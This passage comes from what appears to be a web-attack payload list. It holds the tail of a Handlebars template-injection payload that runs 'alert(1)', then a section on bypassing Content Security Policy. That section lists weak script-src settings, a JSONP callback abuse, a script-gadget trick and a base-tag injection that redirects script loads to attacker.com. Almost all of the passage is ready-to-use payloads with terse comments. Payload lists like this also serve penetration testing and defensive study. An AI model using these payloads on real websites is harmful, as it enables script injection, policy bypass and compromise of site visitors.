        {{this.push "alert(1)"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
</template_injection>

<csp_bypass>
# Weak CSP policies
script-src 'unsafe-inline'          # Allows inline scripts
script-src data:                    # Allows data: URIs
script-src 'unsafe-eval'            # Allows eval()
script-src *                        # Allows any origin

# JSONP endpoints for CSP bypass
<script src="https://trusted-site.com/jsonp?callback=alert"></script>

# Script gadgets (libraries with dangerous functions)
<script src="https://trusted-cdn.com/jquery.js"></script>
<div id="xss" data-callback="alert">Click me</div>

# Base tag injection
<base href="https://attacker.com/">
<script src="/assets/app.js"></script>  # Loads from attacker domain
</csp_bypass>

